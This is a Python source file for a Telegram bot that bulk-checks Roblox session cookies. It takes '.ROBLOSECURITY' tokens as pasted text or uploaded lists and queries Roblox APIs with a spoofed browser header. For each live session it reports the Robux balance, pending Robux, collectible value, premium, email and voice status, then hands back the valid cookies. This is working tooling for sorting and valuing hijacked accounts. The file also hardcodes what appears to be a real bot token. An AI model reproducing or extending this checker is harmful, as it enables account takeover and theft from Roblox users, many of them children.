import telebot
import requests
import io
import re
from datetime import datetime
from flask import Flask
from threading import Thread

# === НАСТРОЙКИ ===
TOKEN = '8526516729:AAHxx09k48kWRk0U7q2AcFSCmEdg3TDcfEw'
bot = telebot.TeleBot(TOKEN)

app = Flask('')
@app.route('/')
def home(): return "Бот активен"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

def get_advanced_info(u_id, cookies):
    adv = {"age": 0, "voice": "Нет ❌", "pending": 0, "email": "❌", "rap": 0}
    # Имитируем реальный браузер максимально подробно
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Referer": "https://www.roblox.com/home"
    }
    try:
        # 1. Возраст
        u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}", headers=headers, timeout=7).json()
        created_dt = datetime.strptime(u_data['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
        adv["age"] = (datetime.now() - created_dt).days
        
        # 2. Почта (через настройки безопасности)
        acc_settings = requests.get("https://accountsettings.roblox.com/v1/email", cookies=cookies, headers=headers, timeout=7).json()
        if acc_settings.get('verified'): 
            adv["email"] = "Да ✅"
        
        # 3. Voice Chat
        voice_req = requests.get("https://voice.roblox.com/v1/settings/is-voice-enabled", cookies=cookies, headers=headers, timeout=7).json()
        if voice_req.get('isVoiceEnabled'): 
            adv["voice"] = "Да ✅"

        # 4. Pending
        summary = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/revenue/summary/30d", cookies=cookies, headers=headers, timeout=7).json()
        adv["pending"] = summary.get('pendingRobux', 0)
        
        # 5. RAP
        inv = requests.get(f"https://inventory.roblox.com/v1/users/{u_id}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100", cookies=cookies, headers=headers, timeout=7).json()
        adv["rap"] = sum(item.get('recentAveragePrice', 0) for item in inv.get('data', []))
    except: pass
    return adv

def extract_cookie(text):
    """Вытаскивает чистый куки, даже если он внутри длинной строки"""
    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\..+)", text)
    return match.group(1).strip() if match else None

def check_cookie(raw_text):
    cookie = extract_cookie(raw_text)
    if not cookie: return {"status": "invalid"}
    
    cookies = {".ROBLOSECURITY": cookie}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    try:
        # Используем основной эндпоинт для проверки жизни куки
        u_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, headers=headers, timeout=10)
        if u_req.status_code != 200: return {"status": "invalid"}
        
        u = u_req.json()
        u_id, u_name = u['id'], u['name']
        
        # Баланс
        robux_data = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies, headers=headers).json()
        robux = robux_data.get('robux', 0)
        
        # Премиум и друзья
        u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}", headers=headers).json()
        premium = "Да ✅" if u_data.get('hasPremium', False) else "Нет ❌"
        f_count = requests.get(f"https://friends.roblox.com/v1/users/{u_id}/friends/count", headers=headers).json().get('count', 0)
        
        adv = get_advanced_info(u_id, cookies)
        
        return {
            "status": "ok", "name": u_name, "id": u_id, "robux": robux,
            "premium": premium, "friends": f_count, "age": adv["age"],
            "voice": adv["voice"], "pending": adv["pending"], "rap": adv["rap"],
            "email": adv["email"], "cookie": cookie
        }
    except: return {"status": "error"}

def format_output(res):
    return (
        f"👤 Аккаунт: {res['name']} (ID: {res['id']})\n"
        f"🎂 Возраст: {res['age']} дней\n"
        f"🌟 Premium: {res['premium']} | 👥 Друзья: {res['friends']}\n"
        f"📧 Почта: {res['email']} | 🎤 Voice: {res['voice']}\n"
        f"💰 Баланс: {res['robux']} R$ (+{res['pending']} Pending)\n"
        f"💎 Ценность (RAP): {res['rap']} R$\n\n"
        f"🍪 КУКИ:\n`{res['cookie']}`\n"
        f"{'='*30}\n"
    )

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "👋 Привет! Пришли файл или куки. Теперь я работаю аккуратнее.")

@bot.message_handler(content_types=['text', 'document'])
def handle(message):
    try:
        if message.content_type == 'text':
            res = check_cookie(message.text)
            if res['status'] == 'ok':
                bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
            elif len(message.text) > 50:
                bot.send_message(message.chat.id, "❌ Невалид.")
        
        elif message.content_type == 'document':
            file_info = bot.get_file(message.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = [l.strip() for l in content.splitlines() if l.strip()]
            
            bot.send_message(message.chat.id, f"⌛ Чек {len(lines)} строк...")
            results = []
            for l in lines:
                res = check_cookie(l)
                if res['status'] == 'ok':
                    results.append(format_output(res))
            
            if results:
                buf = io.BytesIO("".join(results).encode('utf-8'))
                buf.name = "checked.txt"
                bot.send_document(message.chat.id, buf)
            else:
                bot.send_message(message.chat.id, "❌ Валид не найден.")
    except Exception as e:
        print(f"Ошибка: {e}")

if __name__ == '__main__':
    keep_alive()
    bot.infinity_polling()
